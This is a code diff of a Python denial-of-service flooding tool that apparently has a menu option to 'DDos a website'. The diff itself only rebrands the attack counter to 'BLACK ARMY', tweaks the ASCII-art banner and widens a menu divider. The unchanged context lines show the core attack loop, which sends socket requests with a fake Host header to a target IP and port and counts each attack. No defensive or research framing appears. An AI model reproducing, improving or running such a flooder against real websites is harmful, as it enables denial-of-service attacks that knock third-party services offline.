@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[💥]  \033[93mTL-DD0S  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+                print("[💥]  \033[33mBLACK \033[34mARMY  \033[95mATTACK \033[96mNUM \033[36m——> \033[0m"+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
@@ -63,12 +63,12 @@ def ddos():
 def print_red_centered_art():
     os.system("clear")
     art = '''
-  ██████▒▒  █▒▒   ███▒▒    ████▒▒█▒▒  █▒▒    ███▒▒   █████▒▒ ██▒▒      ██▒▒  █▒▒
+  ██████▒▒  █▒▒   ███▒▒    ████▒▒█▒▒  █▒▒    ███▒▒   █████▒▒  ██▒▒      ██▒▒  █▒▒
   █▒▒    █▒▒█▒▒  █▒▒  █▒▒ █▒▒    █▒▒ █▒▒    █▒▒  █▒▒ █▒▒   █▒▒█▒█▒▒    █▒█▒▒ █▒▒
   █▒▒    █▒▒█▒▒ █▒▒    █▒▒█▒▒    █▒▒█▒▒    █▒▒    █▒▒█▒▒   █▒▒█▒▒█▒▒  █▒▒█▒▒ █▒▒
   █▒▒    █▒▒█▒▒ █▒▒    █▒▒█▒▒    █▒█▒▒     █▒▒    █▒▒█▒▒   █▒▒█▒▒ █▒▒█▒▒ █▒▒ █▒▒
   █████▒▒   █▒▒ █▒▒    █▒▒█▒▒    ██▒▒      █▒▒    █▒▒█▒▒   █▒▒█▒▒  █▒█▒▒ █▒▒ █▒▒
-  █▒▒    █▒▒█▒▒ █▒███▒▒█▒▒█▒▒    █▒█▒▒     █████▒▒█▒▒█▒███▒▒ █▒▒   ██▒▒  █▒▒ █▒▒
+  █▒▒    █▒▒█▒▒ █▒███▒▒█▒▒█▒▒    █▒█▒▒     █████▒▒█▒▒█▒███▒▒  █▒▒  ██▒▒  █▒▒ █▒▒
   █▒▒    █▒▒█▒▒ █▒▒    █▒▒█▒▒    █▒▒█▒▒    █▒▒    █▒▒█▒▒█▒▒   █▒▒        █▒▒ █▒▒
   █▒▒    █▒▒█▒▒ █▒▒    █▒▒█▒▒    █▒▒ █▒▒   █▒▒    █▒▒█▒▒ █▒▒  █▒▒        █▒▒ █▒▒
   ██████▒▒  ██████▒▒   █▒▒ ████▒▒█▒▒  █▒▒  █▒▒    █▒▒█▒▒  █▒▒ █▒▒        █▒▒ █▒▒'''
@@ -83,7 +83,7 @@ if __name__ == "__main__":
 def menu():
    # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
     print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
-    print(Fore.WHITE + Style.BRIGHT + "════════════════════════════════════════════════════════")
+    print(Fore.WHITE + Style.BRIGHT + "════════════════════════════════════════════════════════════════════════════════════════════════════════════════ ")
     print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
     print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
     print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
